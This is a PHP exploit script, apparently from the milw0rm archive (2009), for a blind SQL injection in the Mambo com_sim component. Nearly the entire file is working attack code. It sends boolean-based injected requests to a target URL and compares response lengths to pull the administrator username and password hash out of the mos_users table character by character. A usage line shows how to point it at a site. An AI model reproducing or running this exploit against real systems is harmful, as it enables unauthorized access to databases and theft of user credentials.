<?php
ini_set("max_execution_time",0);
print_r('
##############################################################################
#
#                Mambo com_sim Blind SQL Injection Exploit
#
#                             ----->>>> xoron <<<<<-----
#                                xorontr@gmail.com
#                                  XORON (c) 2009
#                          Tesekkurler: Ozan! kahrolsun!srail.
#
#     WARNING!: php xoron.php "http://www.example.com/index.php?option=com_sim&task=viewchar&character_ID=1"
#
##############################################################################
');
if ($argc > 1) {
$url = $argv[1];
$r = strlen(file_get_contents($url."+and+1=1--"));
echo "\nExploiting:\n";
$w = strlen(file_get_contents($url."+and+1=0--"));
$t = abs((100-($w/$r*100)));
echo "Username: ";
for ($i=1; $i <= 30; $i++) {
$laenge = strlen(file_get_contents($url."+and+ascii(substring((select+username+from+mos_users+limit+0,1),".$i.",1))!=0--"));
   if (abs((100-($laenge/$r*100))) > $t-1) {
      $count = $i;
      $i = 30;
   }
}
for ($j = 1; $j < $count; $j++) {
   for ($i = 46; $i <= 122; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+username+from+mos_users+limit+0,1),".$j.",1))%3E".$i."--"));
      if (abs((100-($laenge/$r*100))) > $t-1) {
         $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+username+from+mos_users+limit+0,1),".$j.",1))%3E".($i-1)."--"));
         if (abs((100-($laenge/$r*100))) > $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 122;
      }
   }
}
echo "\nPassword: ";
for ($j = 1; $j <= 49; $j++) {
   for ($i = 46; $i <= 102; $i=$i+2) {
      if ($i == 60) {
         $i = 98;
      }
      $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+password+from+mos_users+limit+0,1),".$j.",1))%3E".$i."--"));
      if (abs((100-($laenge/$r*100))) > $t-1) {
         $laenge = strlen(file_get_contents($url."+and+ascii(substring((select+password+from+mos_users+limit+0,1),".$j.",1))%3E".($i-1)."--"));
         if (abs((100-($laenge/$r*100))) > $t-1) {
            echo chr($i-1);
         } else {
            echo chr($i);
         }
         $i = 102;
      }
   }
}
}
?>

# milw0rm.com [2009-01-25]
